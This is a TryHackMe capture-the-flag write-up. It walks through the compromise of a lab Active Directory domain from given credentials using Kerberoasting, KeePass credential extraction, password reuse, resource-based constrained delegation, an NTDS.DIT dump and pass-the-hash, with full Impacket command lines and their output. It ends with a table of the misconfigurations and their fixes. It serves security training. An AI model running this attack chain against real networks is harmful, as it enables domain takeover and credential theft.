# TryHackMe — Forward (Medium)

> **Category:** Active Directory | Post-Compromise | Lateral Movement  
> **Difficulty:** Medium  
> **Objective:** Initial access is provided — move through the compromised AD environment and achieve full domain compromise.  
> **Key Techniques:** Kerberoasting, KeePass credential extraction, RBCD abuse, S4U2Proxy delegation, NTDS.DIT dump

---

## Table of Contents

1. [Scenario Overview](#scenario-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration with Valid Credentials](#enumeration-with-valid-credentials)
4. [Kerberoasting — svc.helpdesk](#kerberoasting--svchelpdesk)
5. [RDP Access — KeePass Credential Extraction](#rdp-access--keepass-credential-extraction)
6. [Lateral Movement — r.williams](#lateral-movement--rwilliams)
7. [ACL Enumeration — WriteProperty on DC01$](#acl-enumeration--writeproperty-on-dc01)
8. [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
9. [Domain Compromise — secretsdump & Flag](#domain-compromise--secretsdump--flag)
10. [Full Attack Chain](#full-attack-chain)
11. [Misconfigurations & Lessons Learned](#misconfigurations--lessons-learned)
12. [Tools Used](#tools-used)

---

## Scenario Overview

We are given valid domain credentials and told the initial compromise has already happened. The challenge is purely post-exploitation: enumerate the Active Directory environment, move laterally, and escalate to Domain Admin.

**Given credentials:**

| Field | Value |
|-------|-------|
| User | `ctf.local\j.smith` |
| Password | `[REDACTED]` |
| Target | DC01.ctf.local |

---

## Reconnaissance

### Nmap Full Port Scan

```bash
nmap -sC -sV -O -A -p- <TARGET_IP>
```

The scan revealed a classic Domain Controller profile running **Windows Server 2019** (build 17763):

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Kerberos authentication |
| 135/593 | MSRPC | RPC endpoints |
| 139/445 | SMB | **Signing enabled and required** (blocks NTLM relay) |
| 389/3268 | LDAP/GC | Domain: ctf.local |
| 636/3269 | LDAPS | TLS-wrapped |
| 3389 | RDP | Terminal Services |
| 9389 | ADWS | Active Directory Web Services |

Key takeaway: single DC (`DC01.ctf.local`), SMB signing blocks relay attacks, RDP is open.

### DNS Fix (AttackBox)

The AttackBox's `/etc/resolv.conf` was immutable (`chattr +i`), so DNS resolution was fixed via `/etc/hosts`:

```bash
echo "<TARGET_IP> ctf.local dc01.ctf.local DC01.ctf.local" >> /etc/hosts
```

---

## Enumeration with Valid Credentials

### SMB Share Enumeration

```bash
netexec smb <TARGET_IP> -u 'j.smith' -p '[REDACTED]' --shares
```

| Share | Access | Notes |
|-------|--------|-------|
| ADMIN$ | None | Not local admin |
| C$ | None | Not local admin |
| Downloads | READ | Custom share — "File drop share" |
| IPC$ | READ | Standard |
| NETLOGON | READ | Empty |
| SYSVOL | READ | Default GPOs only |

The `Downloads` share was empty. SYSVOL contained only default GPOs with no GPP passwords (Groups.xml, etc.).

### User Enumeration

```bash
netexec smb <TARGET_IP> -u 'j.smith' -p '[REDACTED]' --users
```

| Account | Description | BadPwdCount |
|---------|-------------|-------------|
| Administrator | Built-in admin | 0 |
| j.smith | IT Staff | 0 |
| t.jones | Help Desk | 0 |
| r.williams | Help Desk Senior | 0 |
| **svc.helpdesk** | **HelpDesk Service Acct** | **32** |

The high bad password count on `svc.helpdesk` indicates an active service account — a priority target.

### Group Enumeration via LDAP

```bash
ldapsearch -H ldap://<TARGET_IP> -D 'j.smith@ctf.local' -w '[REDACTED]' \
  -b 'DC=ctf,DC=local' '(objectClass=group)' cn member
```

Critical findings:

| Group | Members | Significance |
|-------|---------|-------------|
| **sysadmin** | r.williams | "IT Sysadmins - **exempt from AppLocker**" |
| **AppLocker-Restricted** | j.smith, t.jones | Restricted execution policy |
| Remote Desktop Users | j.smith, t.jones, r.williams | All three can RDP to DC01 |
| Domain Admins | Administrator | Only built-in admin |

**Key insight:** r.williams is in the `sysadmin` group, exempt from AppLocker, and can run arbitrary executables on DC01. This makes r.williams a high-value lateral movement target.

### AS-REP Roasting — Negative

```bash
GetNPUsers.py ctf.local/ -usersfile users.txt -dc-ip <TARGET_IP> -format hashcat
```

All accounts require Kerberos pre-authentication. AS-REP Roasting is not viable.

---

## Kerberoasting — svc.helpdesk

### SPN Discovery & TGS Request

```bash
GetUserSPNs.py ctf.local/j.smith:'[REDACTED]' -dc-ip <TARGET_IP> -request
```

```
ServicePrincipalName     Name          Delegation
-----------------------  ------------  -----------
helpdesk/DC01            svc.helpdesk  constrained
helpdesk/DC01.ctf.local  svc.helpdesk  constrained
```

The TGS hash was obtained (`$krb5tgs$23$*svc.helpdesk$CTF.LOCAL$...`), etype 23 (RC4).

### Cracking Attempt — Failed

```bash
hashcat -m 13100 svc_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 svc_hash.txt /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

Both wordlists exhausted without cracking. The password is not in common wordlists. However, the Kerberoasting output confirmed two critical facts: `svc.helpdesk` has registered SPNs and is configured for **constrained delegation**.

### Delegation Enumeration

```bash
findDelegation.py ctf.local/j.smith:'[REDACTED]' -dc-ip <TARGET_IP>
```

Only DC01$ appeared (standard unconstrained delegation for a DC). The `svc.helpdesk` account has `TRUSTED_TO_AUTH_FOR_DELEGATION` (UAC: 16843264) but **no `msDS-AllowedToDelegateTo` target** — an unusual configuration that becomes relevant later.

---

## RDP Access — KeePass Credential Extraction

Since j.smith is in the Remote Desktop Users group, we connected via RDP:

```bash
xfreerdp /u:j.smith /p:'[REDACTED]' /v:<TARGET_IP> /cert-ignore
```

### System Enumeration from Inside

Enumerating the filesystem revealed several important findings:

**User profiles on disk:**

```
C:\Users\Administrator
C:\Users\j.smith
C:\Users\r.williams
C:\Users\r.williams.CTF
C:\Users\svc.scanner        ← Not in AD (deleted account, residual profile)
```

**Non-standard directories:**

- `C:\Scripts` — Access Denied (likely restricted to sysadmin group)
- `C:\Downloads` — Empty (the SMB share's physical path)

**Installed software:**

```
C:\Program Files\KeePass Password Safe 2
```

### KeePass Database Discovery

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.kdbx -Force -ErrorAction SilentlyContinue
```

Found: `C:\Users\j.smith\Documents\Database.kdbx`

The KeePass configuration (`KeePass.config.xml`) revealed:

```xml
<KeySources>
    <Association>
        <DatabasePath>..\..\Users\j.smith\Documents\Database.kdbx</DatabasePath>
        <UserAccount>true</UserAccount>
    </Association>
</KeySources>
```

**`<UserAccount>true</UserAccount>`** means the database is protected by **Windows DPAPI** (tied to the j.smith Windows account), not a master password. Since we are logged in as j.smith via RDP, the database opens without any password prompt.

### KeePass Contents

Opening KeePass from the RDP session revealed:

| Title | Username | Password |
|-------|----------|----------|
| Sample Entry | User Name | Password |
| Sample Entry | Michael321 | 12345 |
| **Actual entry** | **t.jones** | **`[REDACTED]`** |

### Password Reuse Check

```bash
netexec smb <TARGET_IP> -u 't.jones' -p '[REDACTED]'    # ✅ SUCCESS
netexec smb <TARGET_IP> -u 'r.williams' -p '[REDACTED]'  # ✅ SUCCESS
```

Both `t.jones` and `r.williams` share the same password. The NTDS dump later confirmed this — both accounts have identical NTLM hashes.

---

## Lateral Movement — r.williams

Connected as r.williams via RDP (or switch sessions). Since r.williams is in the **sysadmin** group (exempt from AppLocker), we have unrestricted execution.

### Automation-Notice.txt

```
C:\Users\r.williams\Desktop\Automation-Notice.txt
```

```
HelpDesk Automation Notice
==========================
A background process handles automatic ticket processing and
service account maintenance for the HelpDesk system.
The automation runs periodically and stores temporary working
files in C:\Windows\Temp.
```

### Kerberos Ticket Discovery

```powershell
dir C:\Windows\Temp
```

```
HelpDesk-Auth.b64    5/20/2026 6:35 PM    1680 bytes
```

The file contained a **base64-encoded Kerberos TGT (.kirbi)** for `svc.helpdesk` to `krbtgt/ctf.local`. However, the ticket timestamps showed it was **expired** (issued 2026-05-20, valid for ~10 hours). While unusable directly, this confirmed the delegation attack vector involving `svc.helpdesk`.

---

## ACL Enumeration — WriteProperty on DC01$

With the delegation ticket expired and password uncrackable, we pivoted to ACL analysis:

```powershell
(Get-Acl "AD:$(Get-ADComputer DC01)").Access |
  Format-Table IdentityReference,ActiveDirectoryRights,AccessControlType -AutoSize
```

Critical finding:

```
CTF\r.williams    WriteProperty    Allow
```

**r.williams has WriteProperty on the DC01$ computer object.** This enables writing to `msDS-AllowedToActOnBehalfOfOtherIdentity` — the attribute that controls **Resource-Based Constrained Delegation (RBCD)**.

Combined with `SeMachineAccountPrivilege` (confirmed via `whoami /priv`), we can create a machine account and configure RBCD.

---

## Resource-Based Constrained Delegation (RBCD)

### Theory

RBCD flips the traditional delegation model: instead of the *delegating* account specifying where it can delegate to, the *target resource* specifies who can delegate to it (via `msDS-AllowedToActOnBehalfOfOtherIdentity`). If we can write to this attribute on DC01$, we can authorize our own machine account to impersonate any user when accessing DC01.

### Step 1 — Create Machine Account

```bash
addcomputer.py ctf.local/r.williams:'[REDACTED]' \
  -computer-name 'FAKECOMP$' \
  -computer-pass '[REDACTED]' \
  -dc-ip <TARGET_IP>
```

```
[*] Successfully added machine account FAKECOMP$ with password [REDACTED].
```

This works because `ms-DS-MachineAccountQuota` defaults to 10, allowing any domain user to create computer accounts.

### Step 2 — Configure RBCD

```bash
rbcd.py ctf.local/r.williams:'[REDACTED]' \
  -delegate-from 'FAKECOMP$' \
  -delegate-to 'DC01$' \
  -action write \
  -dc-ip <TARGET_IP>
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKECOMP$ can now impersonate users on DC01$ via S4U2Proxy
```

### Step 3 — S4U2Self + S4U2Proxy

```bash
getST.py ctf.local/'FAKECOMP$':'[REDACTED]' \
  -spn cifs/DC01.ctf.local \
  -impersonate Administrator \
  -dc-ip <TARGET_IP>
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

---

## Domain Compromise — secretsdump & Flag

### NTDS.DIT Dump via DRSUAPI

```bash
secretsdump.py -k -no-pass DC01.ctf.local
```

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED_HASH]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[REDACTED_HASH]:::
ctf.local\j.smith:1609:aad3b435b51404eeaad3b435b51404ee:[REDACTED_HASH]:::
ctf.local\t.jones:1610:aad3b435b51404eeaad3b435b51404ee:[REDACTED_HASH]:::
ctf.local\r.williams:1611:aad3b435b51404eeaad3b435b51404ee:[REDACTED_HASH]:::
ctf.local\svc.helpdesk:1612:aad3b435b51404eeaad3b435b51404ee:[REDACTED_HASH]:::
```

Notable: `t.jones` and `r.williams` have **identical NTLM hashes**, confirming password reuse.

### Pass-the-Hash → Administrator Shell

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:[REDACTED_HASH] Administrator@<TARGET_IP>
```

### Flag

```
C:\Users\Administrator\Desktop> type flag.txt
THM{[REDACTED]}
```

---

## Full Attack Chain

```
j.smith (given creds)
    │
    ├─ Nmap → DC01.ctf.local (Windows Server 2019, single DC)
    ├─ SMB/LDAP Enum → 4 users, svc.helpdesk (SPN + constrained delegation)
    ├─ Kerberoasting → TGS hash obtained (uncrackable with standard wordlists)
    │
    ├─ RDP as j.smith → KeePass database (DPAPI, no master password)
    │   └─ Extracted creds: t.jones : [REDACTED]
    │
    ├─ Password reuse → r.williams : [REDACTED]
    │   └─ r.williams ∈ sysadmin (exempt from AppLocker)
    │
    ├─ C:\Windows\Temp\HelpDesk-Auth.b64 → Expired svc.helpdesk TGT
    │   └─ Confirmed delegation attack vector
    │
    ├─ ACL Enum → r.williams has WriteProperty on DC01$
    │
    └─ RBCD Attack
        ├─ addcomputer.py → FAKECOMP$ created
        ├─ rbcd.py → FAKECOMP$ → msDS-AllowedToActOnBehalfOfOtherIdentity on DC01$
        ├─ getST.py → S4U2Self + S4U2Proxy → Administrator ticket
        ├─ secretsdump.py → Full NTDS.DIT dump (DRSUAPI)
        └─ psexec.py → Pass-the-Hash → Administrator shell → FLAG
```

---

## Misconfigurations & Lessons Learned

| # | Misconfiguration | Impact | Remediation |
|---|-----------------|--------|-------------|
| 1 | KeePass database protected only by DPAPI (no master password) | Any RDP session as j.smith opens the password database | Always use a strong master password in addition to Windows User Account protection |
| 2 | Password reuse across t.jones and r.williams | Compromising one low-privilege account leads to lateral movement | Enforce unique passwords; use LAPS or a PAM solution for service accounts |
| 3 | WriteProperty ACL on DC01$ granted to r.williams | Enables RBCD configuration → domain compromise | Grant only specific attribute-level write permissions; never broad WriteProperty on computer objects |
| 4 | Default MachineAccountQuota (10) | Any domain user can create computer accounts for RBCD | Set `ms-DS-MachineAccountQuota` to 0 in production |
| 5 | Kerberos ticket stored in cleartext (C:\Windows\Temp) | Exposes service account TGT to any local user | Use Credential Guard; avoid writing tickets to disk; restrict Temp folder ACLs |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| Netexec (nxc) | SMB share/user enumeration, password spraying |
| Impacket (GetUserSPNs.py) | Kerberoasting — TGS hash extraction |
| Impacket (GetNPUsers.py) | AS-REP Roasting attempt |
| Impacket (findDelegation.py) | Delegation enumeration |
| Impacket (addcomputer.py) | Machine account creation |
| Impacket (rbcd.py) | RBCD configuration |
| Impacket (getST.py) | S4U2Self/S4U2Proxy ticket impersonation |
| Impacket (secretsdump.py) | NTDS.DIT dump via DRSUAPI |
| Impacket (psexec.py) | Remote shell via Pass-the-Hash |
| Impacket (ticketConverter.py) | Kirbi to ccache conversion |
| Hashcat / John | TGS hash cracking attempts |
| ldapsearch | LDAP enumeration (users, groups, ACLs, attributes) |
| xfreerdp | RDP access to DC01 |
| KeePass | Password database extraction |
| smbclient | SMB share browsing |

---

*Writeup by Artem — [GitHub CTF Writeups Repository]*
